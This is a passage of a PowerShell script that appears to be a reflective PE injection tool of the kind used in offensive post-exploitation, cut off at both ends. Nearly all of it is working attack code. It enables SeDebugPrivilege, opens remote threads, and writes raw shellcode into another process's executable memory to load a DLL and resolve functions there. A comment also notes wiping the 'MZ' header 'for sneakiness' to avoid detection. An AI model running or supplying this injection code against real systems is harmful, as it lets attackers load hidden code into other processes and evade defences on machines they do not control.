                $GetProcAddress = $UnsafeNativeMethods.GetMethods() | Where { $_.Name -eq "GetProcAddress" } | Select-Object -first 1
    
                # Get a handle to the module specified
                $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    
                # Return the address of the function
                try {
                    $tmpPtr = New-Object IntPtr
                    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
                    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
                }
                catch {
                    # Windows 10 v1803 needs $Kern32Handle as a System.IntPtr instead of System.Runtime.InteropServices.HandleRef
                    Write-Output $GetProcAddress.Invoke($null, @($Kern32Handle, $Procedure))
                }
            }
    
            Function Enable-SeDebugPrivilege {
                Param(
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Types,
    
                    [Parameter(Position = 3, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants
                )
    
                [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
                if ($ThreadHandle -eq [IntPtr]::Zero) {
                    Throw "Unable to get the handle to the current thread"
                }
    
                [IntPtr]$ThreadToken = [IntPtr]::Zero
                [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false) {
                    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN) {
                        $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                        if ($Result -eq $false) {
                            Throw "Unable to impersonate self"
                        }
    
                        $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                        if ($Result -eq $false) {
                            Throw "Unable to OpenThreadToken."
                        }
                    }
                    else {
                        Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
                    }
                }
    
                [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
                $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
                if ($Result -eq $false) {
                    Throw "Unable to call LookupPrivilegeValue"
                }
    
                [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
                [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
                $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
                $TokenPrivileges.PrivilegeCount = 1
                $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
                $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
    
                $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
                if (($Result -eq $false) -or ($ErrorCode -ne 0)) {
                    #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
                }
    
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
            }
    
            Function Create-RemoteThread {
                Param(
                    [Parameter(Position = 1, Mandatory = $true)]
                    [IntPtr]
                    $ProcessHandle,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [IntPtr]
                    $StartAddress,
    
                    [Parameter(Position = 3, Mandatory = $false)]
                    [IntPtr]
                    $ArgumentPtr = [IntPtr]::Zero,
    
                    [Parameter(Position = 4, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions
                )
    
                [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
    
                $OSVersion = [Environment]::OSVersion.Version
                #Vista and Win7
                if (($OSVersion -ge (New-Object 'Version' 6, 0)) -and ($OSVersion -lt (New-Object 'Version' 6, 2))) {
                    #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
                    $RetVal = $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
                    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
                        Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
                    }
                }
                #XP/Win8
                else {
                    #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
                    $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
                }
    
                if ($RemoteThreadHandle -eq [IntPtr]::Zero) {
                    Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
                }
    
                return $RemoteThreadHandle
            }
    
            Function Get-ImageNtHeaders {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [IntPtr]
                    $PEHandle,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Types
                )
    
                $NtHeadersInfo = New-Object System.Object
    
                #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
                $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
    
                #Get IMAGE_NT_HEADERS
                [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
                $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
                $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
    
                #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
                if ($imageNtHeaders64.Signature -ne 0x00004550) {
                    throw "Invalid IMAGE_NT_HEADER signature."
                }
    
                if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC') {
                    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
                    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
                }
                else {
                    $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
                    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
                    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
                }
    
                return $NtHeadersInfo
            }
    
    
            #This function will get the information needed to allocated space in memory for the PE
            Function Get-PEBasicInfo {
                Param(
                    [Parameter( Position = 0, Mandatory = $true )]
                    [Byte[]]
                    $PEBytes,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Types
                )
    
                $PEInfo = New-Object System.Object
    
                #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
                [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
    
                #Get NtHeadersInfo
                $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
    
                #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
                $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
                $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
                $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
                $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
                $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
    
                #Free the memory allocated above, this isn't where we allocate the PE to memory
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
    
                return $PEInfo
            }
    
    
            #PEInfo must contain the following NoteProperties:
            #   PEHandle: An IntPtr to the address the PE is loaded to in memory
            Function Get-PEDetailedInfo {
                Param(
                    [Parameter( Position = 0, Mandatory = $true)]
                    [IntPtr]
                    $PEHandle,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Types,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants
                )
    
                if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero) {
                    throw 'PEHandle is null or IntPtr.Zero'
                }
    
                $PEInfo = New-Object System.Object
    
                #Get NtHeaders information
                $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
    
                #Build the PEInfo object
                $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
                $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
                $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
                $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
                $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
    
                if ($PEInfo.PE64Bit -eq $true) {
                    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
                    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
                }
                else {
                    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
                    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
                }
    
                if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL) {
                    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
                }
                elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) {
                    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
                }
                else {
                    Throw "PE file is not an EXE or DLL"
                }
    
                return $PEInfo
            }
    
            Function Import-DllInRemoteProcess {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [IntPtr]
                    $RemoteProcHandle,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [IntPtr]
                    $ImportDllPathPtr
                )
    
                $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
    
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
                $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                if ($RImportDllPathPtr -eq [IntPtr]::Zero) {
                    Throw "Unable to allocate memory in the remote process"
                }
    
                [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
    
                if ($Success -eq $false) {
                    Throw "Unable to write DLL path to remote process memory"
                }
                if ($DllPathSize -ne $NumBytesWritten) {
                    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
                }
    
                $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
                $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
    
                [IntPtr]$DllAddress = [IntPtr]::Zero
                #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
                #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
                if ($PEInfo.PE64Bit -eq $true) {
                    #Allocate memory for the address returned by LoadLibraryA
                    $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                    if ($LoadLibraryARetMem -eq [IntPtr]::Zero) {
                        Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
                    }
    
                    #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
                    $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
                    $LoadLibrarySC2 = @(0x48, 0xba)
                    $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
                    $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
    
                    $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
                    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                    $SCPSMemOriginal = $SCPSMem
    
                    Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                    Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                    Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                    Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)
    
                    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                    if ($RSCAddr -eq [IntPtr]::Zero) {
                        Throw "Unable to allocate memory in the remote process for shellcode"
                    }
    
                    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
                        Throw "Unable to write shellcode to remote process memory."
                    }
    
                    $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                    if ($Result -ne 0) {
                        Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                    }
    
                    #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
                    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
                    if ($Result -eq $false) {
                        Throw "Call to ReadProcessMemory failed"
                    }
                    [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
    
                    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                }
                else {
                    [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
                    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                    if ($Result -ne 0) {
                        Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                    }
    
                    [Int32]$ExitCode = 0
                    $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
                    if (($Result -eq 0) -or ($ExitCode -eq 0)) {
                        Throw "Call to GetExitCodeThread failed"
                    }
    
                    [IntPtr]$DllAddress = [IntPtr]$ExitCode
                }
    
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
    
                return $DllAddress
            }
    
            Function Get-RemoteProcAddress {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [IntPtr]
                    $RemoteProcHandle,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [IntPtr]
                    $RemoteDllHandle,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [IntPtr]
                    $FunctionNamePtr, #This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)
    
                    [Parameter(Position = 3, Mandatory = $true)]
                    [Bool]
                    $LoadByOrdinal
                )
    
                $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
    
                [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
                #If not loading by ordinal, write the function name to the remote process memory
                if (-not $LoadByOrdinal) {
                    $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)
    
                    #Write FunctionName to memory (will be used in GetProcAddress)
                    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
                    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                    if ($RFuncNamePtr -eq [IntPtr]::Zero) {
                        Throw "Unable to allocate memory in the remote process"
                    }
    
                    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
                    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
                    if ($Success -eq $false) {
                        Throw "Unable to write DLL path to remote process memory"
                    }
                    if ($FunctionNameSize -ne $NumBytesWritten) {
                        Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
                    }
                }
                #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
                else {
                    $RFuncNamePtr = $FunctionNamePtr
                }
    
                #Get address of GetProcAddress
                $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
                $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes
    
                #Allocate memory for the address returned by GetProcAddress
                $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                if ($GetProcAddressRetMem -eq [IntPtr]::Zero) {
                    Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
                }
    
                #Write Shellcode to the remote process which will call GetProcAddress
                #Shellcode: GetProcAddress.asm
                [Byte[]]$GetProcAddressSC = @()
                if ($PEInfo.PE64Bit -eq $true) {
                    $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
                    $GetProcAddressSC2 = @(0x48, 0xba)
                    $GetProcAddressSC3 = @(0x48, 0xb8)
                    $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
                    $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else {
                    $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
                    $GetProcAddressSC2 = @(0xb9)
                    $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
                    $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
                    $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
    
                Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
    
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero) {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
                    Throw "Unable to write shellcode to remote process memory."
                }
    
                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0) {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
    
                #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
                [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
                if (($Result -eq $false) -or ($NumBytesWritten -eq 0)) {
                    Throw "Call to ReadProcessMemory failed"
                }
                [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
    
                #Cleanup remote process memory
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
    
                if (-not $LoadByOrdinal) {
                    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                }
    
                return $ProcAddress
            }
    
    
            Function Copy-Sections {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [Byte[]]
                    $PEBytes,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $PEInfo,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions,
    
                    [Parameter(Position = 3, Mandatory = $true)]
                    [System.Object]
                    $Win32Types
                )
    
                for ( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
                    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
                    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
    
                    #Address to copy the section to
                    [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
    
                    #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
                    #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
                    #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
                    #    so truncate SizeOfRawData to VirtualSize
                    $SizeOfRawData = $SectionHeader.SizeOfRawData
    
                    if ($SectionHeader.PointerToRawData -eq 0) {
                        $SizeOfRawData = 0
                    }
    
                    if ($SizeOfRawData -gt $SectionHeader.VirtualSize) {
                        $SizeOfRawData = $SectionHeader.VirtualSize
                    }
    
                    if ($SizeOfRawData -gt 0) {
                        Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
